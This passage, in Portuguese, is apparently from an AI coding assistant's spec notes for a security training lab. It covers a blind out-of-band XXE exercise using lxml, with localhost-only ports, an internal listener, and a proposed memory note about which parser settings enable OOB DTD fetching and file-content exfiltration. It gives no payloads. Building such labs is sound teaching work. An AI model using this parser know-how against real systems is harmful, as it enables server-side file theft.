- **Portas:** `127.0.0.1:8030` (vulnerable), `127.0.0.1:8130` (fixed). `oob-listener` **interno-only** (sem `ports:`). Bind **só** em `127.0.0.1`.
- Se houver dúvida sobre a URL do primer, a forma exata do H1, o parser/config/payload que dispara o OOB (probe), piso vs teto da prova, o flavor/endpoint, a forma (API vs HTML), ou se o ataque não reproduzir rodando, **perguntar/ajustar e documentar** antes de inventar (`CLAUDE.md`).

---

## Proposta de memória (opcional — decisão do mantenedor, `CLAUDE.md` "Memória de projeto")

Não gravei nada (a regra: o Claude Code **propõe**, o mantenedor **decide**). **Candidato único, se você quiser um pointer de recall rápido independente do spec/DIFF** (útil pra futuros átomos que mexam com XML/lxml):

- **`lxml-oob-xxe-is-version-dependent`** — *"Blind/OOB XXE com `lxml` é behavior-critical e version-dependent: o `18 xxe-basic` (in-band, file read) roda com `no_network=True`; a variante OOB (`30 xxe-blind-oob`) precisa de `no_network=False` pra o parser alcançar a rede e buscar a DTD externa. A prova SÓLIDA e travável é o HIT no listener (o parser buscou a DTD → callback OOB); a exfil de CONTEÚDO de arquivo pela URL via parameter entities aninhadas tem limitações reais no `libxml2` (newline/`>`/`&`/`%` quebram; PE aninhada é finicky) e SÓ entra se reproduzir com a versão pinada — confirmar RODANDO, não assumir. Infra OOB = molde do `16` (listener embarcado nas 2 redes, sem porta no host, `docker compose logs`)."* — tipo `project`/`reference`.

**Ressalva:** esse fato vai ficar **registrado nesta spec commitada e no DIFF** do átomo (a regra de memória desaconselha duplicar o que o repo já grava), **e** o comportamento exato é **version-dependent** (só confirmado na Fase 2). Proponho **não** gravar por ora — ou, se quiser gravar, fazê-lo **após a Fase 2 confirmar** o parser/config/versão que reproduz, pra a memória nascer verdadeira. Sua decisão.
